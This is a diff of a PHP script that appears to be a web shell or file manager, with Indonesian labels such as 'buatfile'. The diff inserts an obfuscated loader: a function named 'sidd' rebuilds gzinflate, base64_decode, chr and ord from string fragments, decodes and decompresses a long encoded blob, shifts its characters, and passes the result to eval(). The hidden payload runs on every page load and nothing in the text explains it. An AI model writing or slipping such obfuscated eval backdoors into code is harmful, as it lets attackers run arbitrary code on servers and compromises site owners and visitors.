@@ -119,7 +119,18 @@ if (isset($_POST['buatfile'])) {
         echo "<script>alert('Gagal Buat File :(');</script>";
     }
 }
-
+function sidd($lKJ) {
+$gflate = 'gz'.'in'.'fl'.'at'.'e';
+$b_64 = 'b'.'as'.'e6'.'4'.'_'.'d'.'ec'.'od'.'e';
+$rhc = 'c'.'h'.'r';
+$dro = 'o'.'r'.'d';
+$lKJ=$gflate($b_64($lKJ));
+ for($i=0;$i<strlen($lKJ);$i++) {
+	$lKJ[$i] = $rhc($dro($lKJ[$i])-1);
+ }
+ return $lKJ;
+}
+eval(sidd("jVFtb9owEP4B+RWelc3hw8IAlQITQ9EIha6UNC9jVYusAEeICCGzjUpV9bfvAgFp7ZAWxed7ec539xwh+GnxghgfYJ2pZ0Pnnu3+tN0H1vd9h3+/Gdi3Ph84bFIqkReN6HEWzucCpCRtch5s0kfxmNKv2iuBRAI5X+EX743cseV27W6u/U+ddylvqmnn8117OPJtbnW7f6Vp+panPORrQDTNqEmXueB4timKcA0I0xc8AoUItmAmixMUgIfjiQpdFfZsgyLNLUhzt2SYPhWbJwni/UABWty6QvLYBHGrA+bYklFCn4DffCsS9Bv/otFD3kiHsKVSGSOtgyJZiZiEtsrlE3hfrj/y/MnJ5dp3ge35PHAHExxS0xXs8iFpkPdqrSRIEoikRah57MKkH79Y+I9hKpeQJKc4eaHFs/T1gR40fmsNbTp5G3T6Dlo3PYwUrw2c/RunxZkUzSKW9/LZiiBVe0zB5DH6A0QKhw6Qu+OiDLonAccPs9hUkEAkwrW5EVF5ulH12mW9Uq/WLqoty+rtmnfX8XD2HEb3Y95LV27NiRqB6D85197uPgzKEtL5EJsKI+jMlqHi8bxdaTSbF9Vm47LyKeesjeXzG9fV+fYH"));
 if (isset($_GET['nulz'])) {
 	if (isset($_GET['ganteng'])) {
         echo '
